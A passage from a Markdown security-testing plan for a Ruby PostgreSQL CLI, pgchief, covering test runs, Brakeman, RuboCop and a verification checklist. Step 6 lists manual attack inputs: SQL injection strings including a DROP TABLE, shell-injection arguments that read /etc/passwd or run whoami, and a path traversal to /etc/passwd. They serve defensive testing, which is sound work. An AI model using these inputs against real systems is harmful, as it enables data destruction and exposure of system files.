- **Integration Tests**: End-to-end security validation

See [docs/SECURITY.md](docs/SECURITY.md) for details.

### Code Coverage

Minimum coverage: **80%**

View coverage report after running tests:
```bash
open coverage/index.html
```
```

**Step 3: Commit**

```bash
git add docs/SECURITY.md README.md
git commit -m "docs: add comprehensive security documentation

- Create SECURITY.md with threat model
- Document all security testing procedures
- Add vulnerability reporting process
- Add security checklist for contributors
- Update README with security testing info"
```

---

## Task 9: Run Full Security Audit

**Step 1: Run all security tests**

Run: `bundle exec rspec spec/security --format documentation`
Expected: All tests PASS

**Step 2: Run integration tests**

Run: `bundle exec rspec spec/integration --format documentation`
Expected: All tests PASS

**Step 3: Run full test suite with coverage**

Run: `COVERAGE=true bundle exec rspec --format documentation`
Expected: All tests PASS, coverage >= 80%

**Step 4: Run Brakeman**

Run: `bundle exec rake security`
Expected: No high/medium confidence warnings

**Step 5: Run RuboCop**

Run: `bundle exec rubocop`
Expected: No new offenses

**Step 6: Manual security testing**

Try various attack vectors manually:

```bash
# SQL injection attempts
bundle exec exe/pgchief database create --database "test'; DROP TABLE users--"
bundle exec exe/pgchief user create --username "admin' OR '1'='1" --password "test"

# Shell injection attempts
bundle exec exe/pgchief backup --database "test; cat /etc/passwd"
bundle exec exe/pgchief restore --database "test" --location "file\`whoami\`"

# Path traversal attempts
bundle exec exe/pgchief restore --database "test" --location "../../../etc/passwd"
```

Expected: All commands reject malicious input with clear error messages

**Step 7: Review coverage report**

Run: `open coverage/index.html`

Review uncovered lines and add tests as needed.

---

## Verification Checklist

- [ ] SimpleCov configured with 80% minimum coverage
- [ ] All security test categories implemented
- [ ] SQL injection tests cover all commands
- [ ] Shell injection tests cover backup/restore
- [ ] Path traversal tests implemented
- [ ] Credential security tests verify encryption
- [ ] Fuzzing tests with random inputs
- [ ] Integration tests verify CLI security
- [ ] Brakeman configured and passing
- [ ] GitHub Actions CI configured
- [ ] Coverage enforcement in CI
- [ ] Security documentation complete
- [ ] Manual security testing performed
- [ ] All tests passing
- [ ] Coverage >= 80%

## Notes

- This test suite should pass after Week 1 and Week 2 implementations
- If running standalone, use these tests to drive security implementation (TDD)
- Fuzzing tests use Faker for generating realistic but malicious data
- Integration tests verify security at the CLI level
- Brakeman provides static analysis for vulnerabilities we might miss in tests
